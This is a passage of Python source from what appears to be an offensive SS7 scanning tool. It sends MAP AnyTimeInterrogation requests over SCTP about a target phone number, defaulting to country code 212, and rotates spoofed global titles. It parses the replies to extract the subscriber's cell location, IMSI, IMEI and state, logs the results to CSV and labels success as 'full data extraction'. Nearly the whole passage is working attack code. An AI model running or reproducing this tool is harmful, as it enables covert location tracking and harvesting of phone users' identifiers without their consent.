            'subscriberState': NULL_VALUE
        }
    elif ati_variant == AtiVariant.EQUIPMENT_STATUS:
        return {
            'subscriberState': NULL_VALUE,
            'imei': NULL_VALUE
        }
    elif ati_variant == AtiVariant.ALL_INFO:
        return {
            'locationInformation': NULL_VALUE,
            'subscriberState': NULL_VALUE,
            'imei': NULL_VALUE
        }
    else:  # STANDARD and MINIMAL
        return {
            'locationInformation': NULL_VALUE
        }

def build_requested_info_manual(ati_variant: AtiVariant) -> bytes:
    """Build requested info manually"""
    info = bytearray()
    
    info.append(0xA1)  # [1] RequestedInfo
    
    length_pos = len(info)
    info.append(0x00)
    
    if ati_variant in [AtiVariant.STANDARD, AtiVariant.LOCATION_ONLY, AtiVariant.ALL_INFO]:
        info.extend([0x80, 0x00])  # [0] locationInformation NULL
    
    if ati_variant in [AtiVariant.SUBSCRIBER_STATE, AtiVariant.ALL_INFO]:
        info.extend([0x81, 0x00])  # [1] subscriberState NULL
    
    if ati_variant in [AtiVariant.EQUIPMENT_STATUS, AtiVariant.ALL_INFO]:
        info.extend([0x86, 0x00])  # [6] imei NULL
    
    # Update length
    info[length_pos] = len(info) - 2
    
    return bytes(info)

def encode_msisdn_professional(msisdn: str) -> bytes:
    """Professional MSISDN encoder"""
    try:
        if PYCRATE['MAPIE'] is not None:
            addr_str = PYCRATE['MAPIE'].AddressString()
            addr_str['NumType'].set_val(1)  # International number
            addr_str['NumPlan'].set_val(1)  # ISDN/Telephony numbering plan
            
            clean_msisdn = re.sub(r'[^\d]', '', msisdn)
            if not clean_msisdn.startswith('212'):
                clean_msisdn = '212' + clean_msisdn
            
            addr_str['Num'].encode(clean_msisdn)
            return addr_str.to_bytes()
    except Exception as e:
        if logger:
            logger.debug(f"Pycrate MSISDN encoding failed: {e}")
    
    # Fallback to manual
    return encode_msisdn_manual(msisdn)

def encode_msisdn_manual(msisdn: str) -> bytes:
    """Manual MSISDN encoder"""
    clean_msisdn = re.sub(r'[^\d]', '', msisdn)
    
    if not clean_msisdn.startswith('212'):
        clean_msisdn = '212' + clean_msisdn
    
    result = bytearray()
    result.append(0x91)  # International number, ISDN numbering plan
    
    digits = clean_msisdn
    if len(digits) % 2 == 1:
        digits += 'F'
    
    for i in range(0, len(digits), 2):
        digit1 = int(digits[i])
        digit2 = int(digits[i + 1]) if digits[i + 1] != 'F' else 0xF
        result.append((digit2 << 4) | digit1)
    
    return bytes(result)

# === Professional Response Parser ===

def extract_tcap_from_sccp_professional(raw_response: bytes) -> Optional[bytes]:
    """Professional TCAP extraction from SCCP"""
    if not raw_response or len(raw_response) < 5:
        return None
    
    try:
        # Try Pycrate first
        if PYCRATE['SCCP'] is not None:
            sccp_msg, err = PYCRATE['SCCP'].parse_SCCP(raw_response)
            if err == 0 and sccp_msg:
                if sccp_msg['Type'].get_val() == 9:  # UDT
                    data_field = sccp_msg.get('Data')
                    if data_field and 'Value' in data_field:
                        return data_field['Value'].get_val()
    except Exception as e:
        if logger:
            logger.debug(f"Pycrate SCCP parsing failed: {e}")
    
    # Manual parsing fallback
    try:
        if raw_response[0] != 0x09:  # Not UDT
            return None
        
        if len(raw_response) < 5:
            return None
        
        ptr_data = raw_response[4]
        data_start = 5 + ptr_data - 1
        
        if data_start >= len(raw_response) or data_start < 0:
            return None
        
        if raw_response[data_start] != 0x03:
            return None
        
        if data_start + 1 >= len(raw_response):
            return None
        
        data_length = raw_response[data_start + 1]
        tcap_start = data_start + 2
        
        if tcap_start + data_length > len(raw_response):
            return None
        
        return raw_response[tcap_start:tcap_start + data_length]
        
    except Exception as e:
        if logger:
            logger.debug(f"Manual SCCP parsing error: {e}")
        return None

def parse_response_professional(raw_response: bytes, unique_id: str) -> ScanResult:
    """Professional response parser with enhanced error handling"""
    
    result = ScanResult()
    result.tcap_outcome = 'ParseError'
    result.error_info = 'Unknown parsing error'
    
    if not raw_response or len(raw_response) < 5:
        result.error_info = f"Response too short: {len(raw_response)} bytes"
        result.rejection_cause = "Invalid response length"
        return result
    
    result.raw_response_hex = raw_response.hex()
    result.bytes_received = len(raw_response)
    
    try:
        print_connection_status("", 0, "PARSING", f"Parsing {len(raw_response)} bytes", unique_id=unique_id)
        
        # Extract TCAP payload
        tcap_payload = extract_tcap_from_sccp_professional(raw_response)
        if not tcap_payload:
            result.error_info = "Failed to extract TCAP payload"
            result.rejection_cause = "SCCP parsing failed"
            return result
        
        if logger:
            logger.debug(f"[{unique_id}] TCAP payload extracted: {len(tcap_payload)} bytes")
        
        # Parse TCAP message
        try:
            if PYCRATE['TCAP_defs'] is not None:
                tcap_message = deepcopy(PYCRATE['TCAP_defs'].TCMessage)
                tcap_message.from_ber(tcap_payload)
                tcap_val = tcap_message.get_val()
                
                if logger:
                    logger.debug(f"[{unique_id}] TCAP message parsed using Pycrate")
                
                # Process based on message type
                if isinstance(tcap_val, tuple) and len(tcap_val) >= 2:
                    msg_type, msg_content = tcap_val[0], tcap_val[1]
                    
                    if msg_type in ['end', 'continue']:
                        result = process_tcap_response_professional(msg_content, unique_id, result)
                    elif msg_type == 'abort':
                        result.tcap_outcome = 'Abort'
                        result.error_info = "TCAP Abort received"
                        result.rejection_cause = "TCAP Abort"
                    else:
                        result.tcap_outcome = f"Unknown_TCAP({msg_type})"
                        result.error_info = f"Unknown TCAP message type: {msg_type}"
            else:
                raise Exception("Pycrate TCAP not available")
            
        except Exception as tcap_error:
            if logger:
                logger.debug(f"[{unique_id}] TCAP parsing failed: {tcap_error}")
            
            # Fallback to manual parsing
            result = parse_components_manually_professional(tcap_payload, unique_id, result)
        
    except Exception as e:
        if logger:
            logger.error(f"[{unique_id}] Response parsing exception: {e}")
        result.error_info = f"Parsing exception: {str(e)[:100]}"
        result.rejection_cause = f"Parser error: {type(e).__name__}"
    
    return result

def process_tcap_response_professional(msg_content: Any, unique_id: str, result: ScanResult) -> ScanResult:
    """Professional TCAP response processor"""
    
    try:
        if isinstance(msg_content, dict):
            # Extract DTID
            if 'dtid' in msg_content:
                result.received_dtid = msg_content['dtid'].hex() if isinstance(msg_content['dtid'], bytes) else str(msg_content['dtid'])
            
            # Process components
            if 'components' in msg_content and msg_content['components']:
                components = msg_content['components']
                
                for component in components:
                    if isinstance(component, tuple) and len(component) >= 2:
                        comp_type, comp_data = component[0], component[1]
                        
                        if comp_type == 'returnResultLast':
                            result.tcap_outcome = 'ReturnResultLast'
                            result.success = True
                            
                            # Try to parse MAP response
                            if isinstance(comp_data, dict) and 'resultretres' in comp_data:
                                param_data = comp_data['resultretres'].get('parameter', b'')
                                if isinstance(param_data, bytes):
                                    enhanced_result = decode_ati_response_professional(param_data, unique_id)
                                    if enhanced_result:
                                        result.location_info = enhanced_result.location_info
                                        result.subscriber_info = enhanced_result.subscriber_info
                                        result.map_version = enhanced_result.map_version
                                        result.error_info = "MAP ATI Response parsed successfully"
                                        break
                        
                        elif comp_type == 'returnError':
                            result.tcap_outcome = 'ReturnError'
                            if isinstance(comp_data, dict) and 'errorCode' in comp_data:
                                error_code = comp_data['errorCode']
                                result.error_code = error_code
                                result.error_info = MAP_ERRORS.get(error_code, f"MAP Error {error_code}")
                                result.rejection_cause = f"MAP Error {error_code}"
                        
                        elif comp_type == 'reject':
                            result.tcap_outcome = 'Reject'
                            result.error_info = "TCAP Reject received"
                            result.rejection_cause = "TCAP Reject"
    
    except Exception as e:
        if logger:
            logger.debug(f"[{unique_id}] TCAP response processing error: {e}")
    
    return result

def parse_components_manually_professional(tcap_payload: bytes, unique_id: str, result: ScanResult) -> ScanResult:
    """Manual component parser as fallback"""
    
    if len(tcap_payload) < 2:
        result.error_info = "TCAP payload too short for manual parsing"
        result.rejection_cause = "Invalid TCAP length"
        return result
    
    tcap_type = tcap_payload[0]
    
    if tcap_type in [TCAP_TAGS['MSG_END'], TCAP_TAGS['MSG_CONTINUE']]:
        offset = 2
        
        while offset < len(tcap_payload) - 1:
            tag = tcap_payload[offset]
            
            if tag == TCAP_TAGS['COMPONENT_PORTION']:
                length = tcap_payload[offset + 1]
                comp_start = offset + 2
                comp_end = comp_start + length
                
                if comp_end <= len(tcap_payload):
                    comp_data = tcap_payload[comp_start:comp_end]
                    result = parse_components_data_professional(comp_data, unique_id, result)
                break
            
            offset += 1
    
    elif tcap_type == TCAP_TAGS['MSG_ABORT']:
        result.tcap_outcome = 'Abort'
        result.error_info = "TCAP Abort received"
        result.rejection_cause = "TCAP Abort"
    
    return result

def parse_components_data_professional(comp_data: bytes, unique_id: str, result: ScanResult) -> ScanResult:
    """Professional component data parser"""
    
    offset = 0
    
    while offset < len(comp_data):
        try:
            if offset >= len(comp_data):
                break
            
            comp_tag = comp_data[offset]
            
            if comp_tag == TCAP_TAGS['COMP_RETURN_RESULT_LAST']:
                result.tcap_outcome = 'ReturnResultLast'
                result.success = True
                result.error_info = "ReturnResultLast detected"
                
                # Try to extract MAP response data
                pattern_result = find_cgi_patterns_professional(comp_data[offset:], unique_id)
                if pattern_result:
                    result.location_info = pattern_result
                
                break
                
            elif comp_tag == TCAP_TAGS['COMP_RETURN_ERROR']:
                result.tcap_outcome = 'ReturnError'
                try:
                    for i in range(offset, min(offset + 20, len(comp_data) - 1)):
                        if comp_data[i] == 0x02 and i + 2 < len(comp_data):
                            error_code = comp_data[i + 2]
                            if error_code in MAP_ERRORS:
                                result.error_info = MAP_ERRORS[error_code]
                                result.error_code = error_code
                                result.rejection_cause = f"MAP Error {error_code}"
                                break
                except Exception:
                    result.error_info = "MAP Error detected"
                    result.rejection_cause = "Unknown MAP Error"
                break
                
            elif comp_tag == TCAP_TAGS['COMP_REJECT']:
                result.tcap_outcome = 'Reject'
                result.error_info = "TCAP Reject detected"
                result.rejection_cause = "TCAP Component Reject"
                break
            
            offset += 1
            
        except Exception as e:
            if logger:
                logger.debug(f"[{unique_id}] Component parsing error at offset {offset}: {e}")
            break
    
    return result

def find_cgi_patterns_professional(data: bytes, unique_id: str) -> Optional[EnhancedLocationInfo]:
    """Professional CGI pattern finder"""
    
    for i in range(len(data) - 6):
        try:
            potential_plmn = data[i:i+3]
            
            # PLMN validation
            valid_plmn = True
            for byte in potential_plmn:
                if ((byte & 0x0F) > 9 and (byte & 0x0F) != 0xF) or \
                   (((byte >> 4) & 0x0F) > 9 and ((byte >> 4) & 0x0F) != 0xF):
                    valid_plmn = False
                    break
            
            if valid_plmn:
                # Try CGI (7 bytes)
                if i + 7 <= len(data):
                    test_cgi = data[i:i+7]
                    try:
                        mcc, mnc = decode_plmn_professional(test_cgi[:3])
                        lac = int.from_bytes(test_cgi[3:5], 'big')
                        ci = int.from_bytes(test_cgi[5:7], 'big')
                        
                        # Validate reasonable values
                        if 100 <= int(mcc) <= 999 and 0 <= int(mnc) <= 999 and 0 < lac < 65536 and 0 < ci < 65536:
                            location = EnhancedLocationInfo()
                            location.mcc = mcc
                            location.mnc = mnc
                            location.lac = str(lac)
                            location.cell_id = str(ci)
                            location.cgi_found = True
                            
                            if logger:
                                logger.info(f"[{unique_id}] CGI found: MCC={mcc}, MNC={mnc}, LAC={lac}, CI={ci}")
                            return location
                    except Exception:
                        continue
        
        except Exception:
            continue
    
    return None

def decode_ati_response_professional(response_data: bytes, unique_id: str) -> Optional[ScanResult]:
    """Professional MAP ATI response decoder"""
    
    if not response_data or len(response_data) < 4:
        return None
    
    try:
        if logger:
            logger.debug(f"[{unique_id}] ATI response decoding started")
        
        result = ScanResult()
        result.parsed_data_size = len(response_data)
        
        # Try Pycrate decoding first
        if PYCRATE['MAP_defs'] is not None:
            MAP_MS_DataTypes = getattr(PYCRATE['MAP_defs'], 'MAP_MS_DataTypes', None)
            if MAP_MS_DataTypes:
                AtiResType = getattr(MAP_MS_DataTypes, 'AnyTimeInterrogationRes', None)
                if AtiResType:
                    try:
                        ati_response = deepcopy(AtiResType)
                        ati_response.from_ber(response_data)
                        response_val = ati_response.get_val()
                        
                        if logger:
                            logger.info(f"[{unique_id}] MAP response decoded successfully")
                        
                        # Extract location information
                        if 'locationInformation' in response_val:
                            result.location_info = parse_location_information_professional(
                                response_val['locationInformation'], unique_id
                            )
                        
                        # Extract subscriber information  
                        if 'subscriberInfo' in response_val:
                            result.subscriber_info = parse_subscriber_info_professional(
                                response_val['subscriberInfo'], unique_id
                            )
                        
                        result.map_version = "v3"
                        result.success = True
                        
                        return result
                        
                    except Exception as decode_error:
                        if logger:
                            logger.debug(f"[{unique_id}] Pycrate decode error: {decode_error}")
    
    except Exception as e:
        if logger:
            logger.debug(f"[{unique_id}] ATI response parsing failed: {e}")
    
    return None

def parse_location_information_professional(location_data: Any, unique_id: str) -> EnhancedLocationInfo:
    """Professional location information parser"""
    
    location = EnhancedLocationInfo()
    
    try:
        if isinstance(location_data, dict):
            # Parse Cell Global Identity
            if 'cellGlobalIdOrServiceAreaIdOrLAI' in location_data:
                cgi_data = location_data['cellGlobalIdOrServiceAreaIdOrLAI']
                if isinstance(cgi_data, tuple) and len(cgi_data) >= 2:
                    cgi_type, cgi_value = cgi_data[0], cgi_data[1]
                    
                    if cgi_type == 'cellGlobalIdOrServiceAreaIdFixedLength' and len(cgi_value) >= 7:
                        try:
                            mcc, mnc = decode_plmn_professional(cgi_value[:3])
                            location.mcc = mcc
                            location.mnc = mnc
                            location.lac = str(int.from_bytes(cgi_value[3:5], 'big'))
                            location.cell_id = str(int.from_bytes(cgi_value[5:7], 'big'))
                            location.cgi_found = True
                            
                            if logger:
                                logger.info(f"[{unique_id}] CGI: MCC={mcc}, MNC={mnc}, LAC={location.lac}, CI={location.cell_id}")
                        except Exception as e:
                            if logger:
                                logger.debug(f"[{unique_id}] CGI parsing error: {e}")
            
            # Parse VLR number
            if 'vlr-number' in location_data:
                vlr_data = location_data['vlr-number']
                if isinstance(vlr_data, bytes):
                    location.vlr_name = decode_tbcd_string(vlr_data[1:])
            
            # Parse MSC number
            if 'msc-number' in location_data:
                msc_data = location_data['msc-number']
                if isinstance(msc_data, bytes):
                    location.msc_name = decode_tbcd_string(msc_data[1:])
            
            # Parse location age
            if 'ageOfLocationInformation' in location_data:
                location.location_age = str(location_data['ageOfLocationInformation'])
            
            # Parse geographical information
            if 'geographicalInformation' in location_data:
                geo_data = location_data['geographicalInformation']
                if isinstance(geo_data, bytes):
                    location.geographical_info = geo_data.hex()
            
            # Parse SGSN number
            if 'sgsn-number' in location_data:
                sgsn_data = location_data['sgsn-number']
                if isinstance(sgsn_data, bytes):
                    location.sgsn_name = decode_tbcd_string(sgsn_data[1:])
            
            # Set success flags
            if location.mcc != "N/A" and location.mnc != "N/A":
                if location.cell_id != "N/A":
                    location.cgi_found = True
                else:
                    location.lai_found = True
        
    except Exception as e:
        if logger:
            logger.debug(f"[{unique_id}] Location parsing error: {e}")
    
    return location

def parse_subscriber_info_professional(subscriber_data: Any, unique_id: str) -> EnhancedSubscriberInfo:
    """Professional subscriber information parser"""
    
    subscriber = EnhancedSubscriberInfo()
    
    try:
        if isinstance(subscriber_data, dict):
            # Parse IMSI
            if 'imsi' in subscriber_data:
                imsi_data = subscriber_data['imsi']
                if isinstance(imsi_data, bytes):
                    subscriber.imsi = decode_tbcd_string(imsi_data)
            
            # Parse MSISDN
            if 'msisdn' in subscriber_data:
                msisdn_data = subscriber_data['msisdn']
                if isinstance(msisdn_data, bytes):
                    subscriber.msisdn = decode_tbcd_string(msisdn_data[1:])
            
            # Parse IMEI
            if 'imei' in subscriber_data:
                imei_data = subscriber_data['imei']
                if isinstance(imei_data, bytes):
                    subscriber.imei = decode_tbcd_string(imei_data)
            
            # Parse subscriber state
            if 'subscriberState' in subscriber_data:
                state_data = subscriber_data['subscriberState']
                if isinstance(state_data, tuple) and len(state_data) >= 2:
                    state_type, state_value = state_data[0], state_data[1]
                    subscriber.subscriber_state = f"{state_type}: {state_value}"
                elif isinstance(state_data, int):
                    states = {0: "assumedIdle", 1: "camelBusy", 2: "notProvidedFromVLR"}
                    subscriber.subscriber_state = states.get(state_data, f"unknown({state_data})")
            
            if logger:
                logger.info(f"[{unique_id}] Subscriber info: IMSI={subscriber.imsi}, State={subscriber.subscriber_state}")
    
    except Exception as e:
        if logger:
            logger.debug(f"[{unique_id}] Subscriber parsing error: {e}")
    
    return subscriber

# === Professional Display Functions ===

def display_professional_result(result: ScanResult, unique_id: str):
    """Display scan result in elegant boxes with professional formatting"""
    
    # Determine status and colors
    if result.location_info.cgi_found and result.subscriber_info.imsi != "N/A":
        status_color = Colors.BRIGHT_GREEN
        status_emoji = "🎯"
        status_text = "FULL SUCCESS - COMPLETE DATA EXTRACTION"
    elif result.location_info.cgi_found:
        status_color = Colors.GREEN
        status_emoji = "📍"
        status_text = "LOCATION SUCCESS - CGI EXTRACTED"
    elif result.subscriber_info.imsi != "N/A":
        status_color = Colors.CYAN
        status_emoji = "📱"
        status_text = "SUBSCRIBER SUCCESS - IMSI EXTRACTED"
    elif result.success:
        status_color = Colors.BLUE
        status_emoji = "✅"
        status_text = "PARTIAL SUCCESS"
    elif 'Timeout' in result.tcap_outcome:
        status_color = Colors.YELLOW
        status_emoji = "⏰"
        status_text = "TIMEOUT"
    elif 'Error' in result.tcap_outcome:
        status_color = Colors.BRIGHT_RED
        status_emoji = "❌"
        status_text = "MAP ERROR"
    elif 'Reject' in result.tcap_outcome:
        status_color = Colors.RED
        status_emoji = "🚫"
        status_text = "TCAP REJECTED"
    elif 'Abort' in result.tcap_outcome:
        status_color = Colors.RED
        status_emoji = "🔴"
        status_text = "TCAP ABORTED"
    else:
        status_color = Colors.WHITE
        status_emoji = "❓"
        status_text = "UNKNOWN STATUS"
    
    with terminal_lock:
        # Main result box
        result_content = [
            f"{status_emoji} {result.ip}:{result.port} - {status_text}",
            f"🕐 Timestamp: {result.timestamp}",
            f"⏱️  Duration: {result.duration_ms:.2f}ms",
            f"🔄 TCAP Outcome: {result.tcap_outcome}",
            f"📡 MAP Version: {result.map_version}"
        ]
        
        if result.error_info != "N/A":
            result_content.append(f"⚠️  Error Info: {result.error_info}")
        
        if result.rejection_cause != "N/A":
            result_content.append(f"🚫 Rejection: {result.rejection_cause}")
        
        print_elegant_box(f"SCAN RESULT [{unique_id}]", result_content, 
                         status_color, Colors.BRIGHT_WHITE, Colors.WHITE)
        
        # Location Information Box
        if result.location_info and (result.location_info.cgi_found or result.location_info.lai_found):
            location_content = []
            if result.location_info.cgi_found:
                location_content.extend([
                    f"🏢 Cell Global Identity (CGI):",
                    f"   📍 MCC: {result.location_info.mcc}",
                    f"   📍 MNC: {result.location_info.mnc}",
                    f"   📍 LAC: {result.location_info.lac}",
                    f"   📍 Cell ID: {result.location_info.cell_id}"
                ])
            
            if result.location_info.vlr_name != "N/A":
                location_content.append(f"📞 VLR Number: {result.location_info.vlr_name}")
            if result.location_info.msc_name != "N/A":
                location_content.append(f"📞 MSC Number: {result.location_info.msc_name}")
            if result.location_info.sgsn_name != "N/A":
                location_content.append(f"📞 SGSN Number: {result.location_info.sgsn_name}")
            if result.location_info.location_age != "N/A":
                location_content.append(f"⏰ Location Age: {result.location_info.location_age}")
            
            print_elegant_box("LOCATION INFORMATION", location_content, 
                             Colors.BRIGHT_GREEN, Colors.BRIGHT_WHITE, Colors.WHITE)
        
        # Subscriber Information Box
        if result.subscriber_info and (result.subscriber_info.imsi != "N/A" or 
                                     result.subscriber_info.subscriber_state != "N/A"):
            subscriber_content = []
            if result.subscriber_info.imsi != "N/A":
                subscriber_content.append(f"🔢 IMSI: {result.subscriber_info.imsi}")
            if result.subscriber_info.msisdn != "N/A":
                subscriber_content.append(f"📞 MSISDN: {result.subscriber_info.msisdn}")
            if result.subscriber_info.imei != "N/A":
                subscriber_content.append(f"📱 IMEI: {result.subscriber_info.imei}")
            if result.subscriber_info.subscriber_state != "N/A":
                subscriber_content.append(f"📊 State: {result.subscriber_info.subscriber_state}")
            if result.subscriber_info.equipment_status != "N/A":
                subscriber_content.append(f"🔧 Equipment: {result.subscriber_info.equipment_status}")
            
            print_elegant_box("SUBSCRIBER INFORMATION", subscriber_content, 
                             Colors.BRIGHT_MAGENTA, Colors.BRIGHT_WHITE, Colors.WHITE)
        
        # Technical Details Box
        technical_content = [
            f"📤 Bytes Sent: {result.bytes_sent}",
            f"📥 Bytes Received: {result.bytes_received}",
            f"🕐 Connection Time: {result.connection_time_ms:.2f}ms",
            f"🕐 Response Time: {result.response_time_ms:.2f}ms",
            f"🎯 Used SSN: {result.used_cgpa_ssn}",
            f"📡 Used GT: {result.used_cgpa_gt}"
        ]
        
        print_elegant_box("TECHNICAL DETAILS", technical_content, 
                         Colors.BRIGHT_BLUE, Colors.BRIGHT_WHITE, Colors.WHITE)

def update_professional_statistics(result: ScanResult, start_time: float):
    """Update professional statistics with comprehensive metrics"""
    with stats_lock:
        PROFESSIONAL_STATS['total_attempts'] += 1
        
        if result.success:
            PROFESSIONAL_STATS['successful_responses'] += 1
        
        if result.location_info and result.location_info.cgi_found:
            PROFESSIONAL_STATS['location_extractions'] += 1
        
        if result.subscriber_info and result.subscriber_info.imsi != "N/A":
            PROFESSIONAL_STATS['imsi_extractions'] += 1
        
        if (result.location_info and result.location_info.cgi_found and 
            result.subscriber_info and result.subscriber_info.imsi != "N/A"):
            PROFESSIONAL_STATS['full_info_extractions'] += 1
        
        # Error tracking
        if 'Timeout' in result.tcap_outcome:
            PROFESSIONAL_STATS['timeouts'] += 1
        elif 'Error' in result.tcap_outcome:
            PROFESSIONAL_STATS['map_errors'] += 1
        elif 'Reject' in result.tcap_outcome:
            PROFESSIONAL_STATS['tcap_rejects'] += 1
        elif 'Abort' in result.tcap_outcome:
            PROFESSIONAL_STATS['tcap_aborts'] += 1
        elif not result.success:
            PROFESSIONAL_STATS['connection_errors'] += 1
        
        # Response time tracking
        response_time = result.response_time_ms
        if response_time > 0:
            if response_time < PROFESSIONAL_STATS['fastest_response']:
                PROFESSIONAL_STATS['fastest_response'] = response_time
            if response_time > PROFESSIONAL_STATS['slowest_response']:
                PROFESSIONAL_STATS['slowest_response'] = response_time
        
        # Error breakdown
        if result.error_info != "N/A":
            PROFESSIONAL_STATS['error_breakdown'][result.error_info] += 1
        
        # Calculate rates
        total = PROFESSIONAL_STATS['total_attempts']
        if total > 0:
            PROFESSIONAL_STATS['success_rate'] = (PROFESSIONAL_STATS['successful_responses'] / total) * 100

def save_result_to_csv(result: ScanResult, csv_file: Path):
    """Save scan result to CSV with comprehensive data"""
    with main_csv_lock:
        file_exists = csv_file.exists()
        
        with open(csv_file, 'a', newline='', encoding='utf-8') as f:
            fieldnames = [
                'timestamp', 'ip', 'port', 'success', 'tcap_outcome', 'duration_ms',
                'mcc', 'mnc', 'lac', 'cell_id', 'imsi', 'msisdn', 'imei',
                'subscriber_state', 'vlr_number', 'msc_number', 'location_age',
                'error_info', 'rejection_cause', 'map_version', 'bytes_sent',
                'bytes_received', 'connection_time_ms', 'response_time_ms',
                'used_ssn', 'used_gt', 'raw_response_hex'
            ]
            
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            
            if not file_exists:
                writer.writeheader()
            
            # Prepare row data
            row_data = {
                'timestamp': result.timestamp,
                'ip': result.ip,
                'port': result.port,
                'success': result.success,
                'tcap_outcome': result.tcap_outcome,
                'duration_ms': result.duration_ms,
                'error_info': result.error_info,
                'rejection_cause': result.rejection_cause,
                'map_version': result.map_version,
                'bytes_sent': result.bytes_sent,
                'bytes_received': result.bytes_received,
                'connection_time_ms': result.connection_time_ms,
                'response_time_ms': result.response_time_ms,
                'used_ssn': result.used_cgpa_ssn,
                'used_gt': result.used_cgpa_gt,
                'raw_response_hex': result.raw_response_hex[:1000]  # Limit length
            }
            
            # Add location data
            if result.location_info:
                row_data.update({
                    'mcc': result.location_info.mcc,
                    'mnc': result.location_info.mnc,
                    'lac': result.location_info.lac,
                    'cell_id': result.location_info.cell_id,
                    'vlr_number': result.location_info.vlr_name,
                    'msc_number': result.location_info.msc_name,
                    'location_age': result.location_info.location_age
                })
            
            # Add subscriber data
            if result.subscriber_info:
                row_data.update({
                    'imsi': result.subscriber_info.imsi,
                    'msisdn': result.subscriber_info.msisdn,
                    'imei': result.subscriber_info.imei,
                    'subscriber_state': result.subscriber_info.subscriber_state
                })
            
            writer.writerow(row_data)

# === Professional Scanning Engine ===

def scan_target_professional(ip: str, port: int, target_msisdn: str, 
                           attempt_num: int = 1) -> ScanResult:
    """Professional MAP-ATI scan with fixed transmission and enhanced debugging"""
    
    unique_id = f"{ip}:{port}:A{attempt_num}"
    start_time = time.time()
    
    result = ScanResult()
    result.ip = ip
    result.port = port
    result.timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    result.attempt_number = attempt_num
    
    # Get random configuration
    cgpa_ssn = random.choice(SCCP_PROFESSIONAL['cgpa_ssn_pool'])
    cgpa_gt = gt_pool.get_next_gt()
    ati_variant = random.choice(list(AtiVariant))
    
    result.used_cgpa_ssn = cgpa_ssn
    result.used_cgpa_gt = cgpa_gt
    result.ati_variant_used = ati_variant.value
    
    # Update SCCP config for this scan
    sccp_config = deepcopy(SCCP_PROFESSIONAL)
    sccp_config['cgpa_ssn'] = cgpa_ssn
    
    sock = None
    
    try:
        print_connection_status(ip, port, "CONNECTING", unique_id=unique_id)
        
        # Create SCTP socket
        sock = DEPS['sctp'].sctpsocket_tcp(socket.AF_INET)
        sock.settimeout(PROFESSIONAL_CONFIG['connection_timeout'])
        
        # Connect
        connect_start = time.time()
        sock.connect((ip, port))
        result.connection_time_ms = (time.time() - connect_start) * 1000
        
        print_connection_status(ip, port, "CONNECTED", 
                              f"in {result.connection_time_ms:.1f}ms", unique_id=unique_id)
        
        # Build message
        print_connection_status(ip, port, "BUILDING", 
                              f"ATI {ati_variant.value} for {target_msisdn}", unique_id=unique_id)
        
        # Generate OTID
        otid = struct.pack('>I', random.randint(1000000, 9999999))
        result.sent_otid = otid.hex()
        
        # Build TCAP message
        print_colored(f"🔧 Building TCAP message for {unique_id}...", Colors.CYAN)
        tcap_data = build_professional_tcap_message(otid, ati_variant, target_msisdn)
        
        if not tcap_data or len(tcap_data) == 0:
            raise ValueError("TCAP message is empty!")
        
        print_colored(f"✅ TCAP message built: {len(tcap_data)} bytes", Colors.GREEN)
        
        # Build SCCP message
        print_colored(f"🔧 Building SCCP message for {unique_id}...", Colors.CYAN)
        sccp_message = build_fixed_sccp_message(target_msisdn, cgpa_gt, tcap_data, sccp_config)
        
        if not sccp_message or len(sccp_message) == 0:
            raise ValueError("SCCP message is empty!")
        
        result.bytes_sent = len(sccp_message)
        print_colored(f"✅ Ready to send {result.bytes_sent} bytes", Colors.GREEN)
        
        # Send message
        print_connection_status(ip, port, "SENDING", 
                              f"{len(sccp_message)} bytes", unique_id=unique_id)
        
        sock.settimeout(PROFESSIONAL_CONFIG['response_timeout'])
        
        send_start = time.time()
        bytes_actually_sent = sock.send(sccp_message)
        
        print_colored(f"📤 Actually sent {bytes_actually_sent} bytes to {ip}:{port}", Colors.CYAN)
        
        if bytes_actually_sent != len(sccp_message):
            print_colored(f"⚠️  Warning: Expected to send {len(sccp_message)} bytes, but sent {bytes_actually_sent}", 
                         Colors.YELLOW)
            result.bytes_sent = bytes_actually_sent
        
        if bytes_actually_sent == 0:
            raise ValueError("No bytes were actually sent!")
        
        # Receive response
        print_connection_status(ip, port, "RECEIVING", unique_id=unique_id)
        
        response_data = sock.recv(8192)
        result.response_time_ms = (time.time() - send_start) * 1000
        
        if response_data:
            print_connection_status(ip, port, "PARSING", 
                                  f"received {len(response_data)} bytes", unique_id=unique_id)
            
            # Parse response
            parsed_result = parse_response_professional(response_data, unique_id)
            
            # Merge results
            result.tcap_outcome = parsed_result.tcap_outcome
            result.error_info = parsed_result.error_info
            result.error_code = parsed_result.error_code
            result.rejection_cause = parsed_result.rejection_cause
            result.success = parsed_result.success
            result.location_info = parsed_result.location_info
            result.subscriber_info = parsed_result.subscriber_info
            result.raw_response_hex = parsed_result.raw_response_hex
            result.bytes_received = parsed_result.bytes_received
            result.received_dtid = parsed_result.received_dtid
            
            # Determine success level
            if result.location_info.cgi_found and result.subscriber_info.imsi != "N/A":
                print_connection_status(ip, port, "SUCCESS", 
                                      "FULL DATA EXTRACTION", Colors.BRIGHT_GREEN, unique_id)
            elif result.location_info.cgi_found:
                print_connection_status(ip, port, "PARTIAL_SUCCESS", 
                                      "LOCATION EXTRACTED", Colors.GREEN, unique_id)
            elif result.subscriber_info.imsi != "N/A":
                print_connection_status(ip, port, "PARTIAL_SUCCESS", 
                                      "SUBSCRIBER DATA", Colors.CYAN, unique_id)
            elif result.success:
                print_connection_status(ip, port, "SUCCESS", 
                                      "RESPONSE RECEIVED", Colors.BLUE, unique_id)
            else:
                print_connection_status(ip, port, "FAILED", 
                                      result.error_info, Colors.RED, unique_id)
        else:
            result.tcap_outcome = 'NoResponse'
            result.error_info = 'No response received'
            result.rejection_cause = 'Empty response'
            print_connection_status(ip, port, "ERROR", "No response", Colors.RED, unique_id)
    
    except socket.timeout:
        result.tcap_outcome = 'Timeout'
        result.error_info = f'Socket timeout after {PROFESSIONAL_CONFIG["response_timeout"]}s'
        result.rejection_cause = 'Socket timeout'
        print_connection_status(ip, port, "TIMEOUT", result.error_info, Colors.YELLOW, unique_id)
    
    except ConnectionRefusedError:
        result.tcap_outcome = 'ConnectionRefused'
        result.error_info = 'Connection refused'
        result.rejection_cause = 'Port closed or filtered'
        print_connection_status(ip, port, "ERROR", "Connection refused", Colors.RED, unique_id)
    
    except Exception as e:
        result.tcap_outcome = 'Exception'
        result.error_info = f'Scan exception: {str(e)[:100]}'
        result.rejection_cause = f'Exception: {type(e).__name__}'
        print_connection_status(ip, port, "ERROR", str(e)[:50], Colors.RED, unique_id)
        
        if logger:
            logger.error(f"[{unique_id}] Scan exception: {e}")
